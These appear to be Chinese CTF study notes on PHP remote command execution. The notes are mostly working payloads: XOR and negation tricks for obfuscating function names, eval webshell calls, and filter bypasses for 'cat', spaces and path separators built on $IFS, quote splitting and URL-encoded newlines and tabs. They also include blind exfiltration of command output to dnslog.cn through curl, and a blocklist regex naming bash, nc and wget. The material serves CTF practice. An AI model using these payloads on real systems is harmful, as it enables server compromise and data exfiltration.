# 命令执行绕过专题

> 系统化 RCE 与 Getshell 笔记：[01-RCE 命令执行](../../03-2026粤桂黔/web漏洞getshell/01-RCE命令执行.md)。
CTF中考点较少，通常是绕过关键字、

### 异或绕过

绕过数字字母校验，利用异或可逆现场构造。

```php
<?php
$a = system;
$b = whoami;
$a($b);
//eval不支持
```

### 取反绕过

```php
<?php
  $s = 'whoami';
  $s = ~$s;
  if($s含有数字字母)
  {
    die();//校验不可见字符
  }; 
  system(~$s);
?>
```

```php
<?php
    $system='system';
    echo urlencode(~$system);
    echo "\n";
    $command='ls';
    echo urlencode(~$command);
?>
```

### 文件上传绕过

利用PHP`无论是否接收文件，只要构造上传⽂件的数据就会在服务器上临时存储⼀个缓存⽂件，缓存⽂件路径为/tmp/phpXXXXXX后6位为随机⼤⼩写数字`的特性

## **eval执行**

1. 查看源码

```php
<?php
  if (isset($_REQUEST['cmd'])) {
  eval($_REQUEST["cmd"]);
  } else {
  highlight_file(__FILE__);
}
?>
```

2. 尝试 `?cmd=ls` 不成功，发现是php封装的，需要`system(ls)`
3. 尝试 `?cmd=system(ls)`不成功，发现需要加上`;`
4. 尝试`?cmd=system(ls);`和`?cmd=system("cat%20/flag_11692");`成功

## 命令注入

### ![1734946124678-cfbc40cb-746e-4e91-aba7-8e7f7507199c.png](./img/rW5I0LLIKx58ONzC/1734946124678-cfbc40cb-746e-4e91-aba7-8e7f7507199c-933719.png)

### 查看源码

### \

### 输入`127.0.0.1&ls`发现当前目录下有 1865498538486.php

### 输入`127.0.0.1&cat 1865498538486.php`没有响应，可能存在编码无法显示

### 输入`127.0.0.1&cat 1865498538486.php | base64`，在解码得到flag

## cat过滤

```php
<?php
$res = FALSE;
if (isset($_GET['ip']) && $_GET['ip']) {
    $ip = $_GET['ip'];
    $m = [];
    if (!preg_match_all("/cat/", $ip, $m)) {
        $cmd = "ping -c 4 {$ip}";
        exec($cmd, $res);
    } else {
        $res = $m;
    }
}
?>
```

1. `''`绕过
2. `""`绕过
3. Linux特殊变量绕过 `ca$@t`
4. `more` 绕过

## 空格过滤

```php
<?php

$res = FALSE;

if (isset($_GET['ip']) && $_GET['ip']) {
    $ip = $_GET['ip'];
    $m = [];
    if (!preg_match_all("/ /", $ip, $m)) {
        $cmd = "ping -c 4 {$ip}";
        exec($cmd, $res);
    } else {
        $res = $m;
    }
}
?>
```

1. `<>`
2. `$IFS$9`
3. `${IFS}`

正则校验了' f → l → a → g '=>变量绕过`?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php`

## 过滤目录分隔符

`127.0.0.1&cd flag_is_here&cat flag_192748609607.php|base64`不行

`127.0.0.1;cd flag_is_here;cat flag_192748609607.php|base64`可以

## 综合过滤

 `%0a` 代替 `换行` ， `%09` 代替 `Tab`（因为flag被过滤了，所以我们通过TAB来补全flag\_is\_here）

 %5c 代替 \（用 \ 来分隔开 cat ，因为 cat 也被过滤了

payload

1. `127.0.0.1%0acd%09*_is_here%0aca%5ct%09*_73122415714959.php`

* `%0a`换行
* `%09`Tab
* `%5c` \

2. `127.0.0.1%0acd${IFS}fl$*ag_is_here%0aca$*t${IFS}f$*lag_78172896931637.php`

* `%0a`换行
* `${IFS}`空格
* `fl$*ag` 替代 flag

### eval($\_GET\['url']);

1. 蚁剑对get型马不友好，在蚁剑的地址栏中，用这个url `http://node5.anna.nssctf.cn:26330/?url=eval($_POST[a]);` 改成post型
2. `url=echo `cat /flag`;` `url=echo`cat /f\*`;`
 1. 用\`\`\`
 2. 一定要记得加`;`
3. url=system('cat /flag');一定要记得加`;`
 1. 同上

### Cookie注入+无回显RCE

`http://www.dnslog.cn/`

http://node5.anna.nssctf.cn:28588/?url=system('curl `whoami`.p7g5ah.dnslog.cn/');

### 被过滤的无回显RCE

```php
if(preg_match('/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\"|\>|\<|\%|\$/i',$url))
{ 
    echo "Sorry,you can't use this.";
} 
else
{
    echo "Can you see anything?";
    exec($url);
} 
```

1. 可用`''` 或者`\`绕过，

* `l''s = ls`
* ` l\s=ls`

2. `url=`curl l''s / | grep f`.xxxxx.dnslog.cn`
3. `l''s / | grep f`.mrdx8h.dnslog.cn
